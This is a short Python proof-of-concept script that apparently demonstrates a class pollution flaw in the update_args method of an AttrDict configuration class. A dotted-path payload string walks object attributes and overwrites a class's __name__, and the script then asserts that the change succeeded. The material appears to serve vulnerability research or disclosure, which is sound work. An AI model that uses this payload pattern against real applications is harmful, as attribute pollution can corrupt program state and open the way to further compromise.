# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: update_args
# Type: get-attr-set-attr

from dd_core.utils.metacfg import AttrDict

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = ["target.__class__.__name__=pwnd"]

def run_poc():
  cfg = AttrDict()
  cfg.target = target
  cfg.update_args(PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
